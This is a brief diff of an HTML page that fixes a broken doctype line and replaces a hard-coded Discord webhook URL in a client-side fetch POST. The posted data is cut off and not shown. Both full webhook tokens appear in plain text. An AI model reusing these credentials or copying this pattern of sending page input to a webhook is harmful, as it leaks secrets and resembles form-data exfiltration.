@@ -1,4 +1,4 @@
-DOCTYPE html>
+
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -177,7 +177,7 @@ DOCTYPE html>
         return;
       }
 
-      fetch("https://discord.com/api/webhooks/1317307341133058119/VUZ178ogmqHZ-mtGvRkFr00YhkLtCKPVS8aA1WXKPOLJVmYpv_YUrmqz4eGgFrtuKOCB", {
+      fetch("https://discord.com/api/webhooks/1360669483685122110/1aDUOJ_ZZPaSEnQRUikHHNWnGuZ8vSQTITWYiQFmze_RIXRGen9V8uYH4U7_00XKAcJ0", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
